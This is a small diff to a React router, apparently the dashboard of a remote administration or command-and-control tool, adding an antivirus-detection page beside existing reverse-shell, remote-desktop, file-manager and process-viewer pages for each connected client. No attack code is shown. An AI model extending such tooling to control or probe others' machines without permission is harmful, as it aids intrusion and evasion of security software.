@@ -11,6 +11,7 @@ import { ProcessViewer } from "./pages/ProcessViewer";
 import { ReverseShell } from "./pages/ReverseShell";
 import { FileManager } from "./pages/FileManager";
 import { ReverseProxy } from "./pages/ReverseProxy";
+import AVDetection from "./pages/AVDetection";
 
 export const App: React.FC = () => {
   return (
@@ -21,6 +22,7 @@ export const App: React.FC = () => {
         <Route path="/remote-desktop/:addr" element={<RemoteDesktop />} />
         <Route path="/process-viewer/:addr" element={<ProcessViewer />} />
         <Route path="/file-manager/:addr" element={<FileManager />} />
+        <Route path="/av-detection/:addr" element={<AVDetection />} />
         <Route path="/" element={<Layout />}>
           <Route path="/" element={<Clients />} />
           <Route path="/logs" element={<Logs />} />
